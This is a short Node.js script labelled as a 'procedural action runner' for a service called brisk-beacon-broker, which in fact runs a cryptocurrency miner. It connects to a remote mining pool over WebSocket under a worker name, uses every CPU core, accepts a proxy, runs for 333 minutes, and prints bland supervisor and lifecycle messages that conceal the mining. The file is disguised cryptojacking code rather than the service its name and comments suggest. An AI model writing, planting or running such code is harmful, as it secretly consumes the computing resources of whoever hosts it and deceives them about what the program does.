// Procedural action runner for brisk-beacon-broker
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

(async () => {
    const instanceToken = "28aeb1";
    console.log(`[supervisor] Daemon ${config.appName || "brisk-beacon-broker"} active [tag: ${instanceToken}]`);

    const agent = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.brisk-beacon-broker",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (333m) reached, exiting cleanly.");
        process.exit(0);
    }, 333 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
